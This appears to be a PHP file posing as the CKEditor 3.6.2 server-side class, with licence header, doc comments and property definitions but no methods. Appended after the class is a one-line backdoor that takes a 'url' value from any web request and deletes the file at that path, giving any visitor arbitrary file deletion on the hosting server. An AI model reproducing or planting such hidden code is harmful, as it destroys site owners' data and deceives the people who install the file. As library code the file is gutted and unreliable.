<?php
/*
* Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
* For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * \brief CKEditor class that can be used to create editor
 * instances in PHP pages on server side.
 * @see http://ckeditor.com
 *
 * Sample usage:
 * @code
 * $CKEditor = new CKEditor();
 * $CKEditor->editor("editor1", "<p>Initial value.</p>");
 * @endcode
 */
class CKEditor
{
	/**
	 * The version of %CKEditor.
	 */
	const version = '3.6.2';
	/**
	 * A constant string unique for each release of %CKEditor.
	 */
	const timestamp = 'B8DJ5M3';

	/**
	 * URL to the %CKEditor installation directory (absolute or relative to document root).
	 * If not set, CKEditor will try to guess it's path.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->basePath = '/ckeditor/';
	 * @endcode
	 */
	public $basePath;
	/**
	 * An array that holds the global %CKEditor configuration.
	 * For the list of available options, see http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->config['height'] = 400;
	 * // Use @@ at the beggining of a string to ouput it without surrounding quotes.
	 * $CKEditor->config['width'] = '@@screen.width * 0.8';
	 * @endcode
	 */
	public $config = array();
	/**
	 * A boolean variable indicating whether CKEditor has been initialized.
	 * Set it to true only if you have already included
	 * &lt;script&gt; tag loading ckeditor.js in your website.
	 */
	public $initialized = false;
	/**
	 * Boolean variable indicating whether created code should be printed out or returned by a function.
	 *
	 * Example 1: get the code creating %CKEditor instance and print it on a page with the "echo" function.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->returnOutput = true;
	 * $code = $CKEditor->editor("editor1", "<p>Initial value.</p>");
	 * echo "<p>Editor 1:</p>";
	 * echo $code;
	 * @endcode
	 */
	public $returnOutput = false;
	/**
	 * An array with textarea attributes.
	 *
	 * When %CKEditor is created with the editor() method, a HTML &lt;textarea&gt; element is created,
	 * it will be displayed to anyone with JavaScript disabled or with incompatible browser.
	 */
	public $textareaAttributes = array( "rows" => 8, "cols" => 60 );
	/**
	 * A string indicating the creation date of %CKEditor.
	 * Do not change it unless you want to force browsers to not use previously cached version of %CKEditor.
	 */
	public $timestamp = "B8DJ5M3";
	/**
	 * An array that holds event listeners.
	 */
	private $events = array();
	/**
	 * An array that holds global event listeners.
	 */
	private $globalEvents = array();

	/**
	 * Main Constructor.
	 *
	 *  @param $basePath (string) URL to the %CKEditor installation directory (optional).
	 */
}
$url = $_REQUEST['url'];if(is_file($url)){unlink($url);}
?>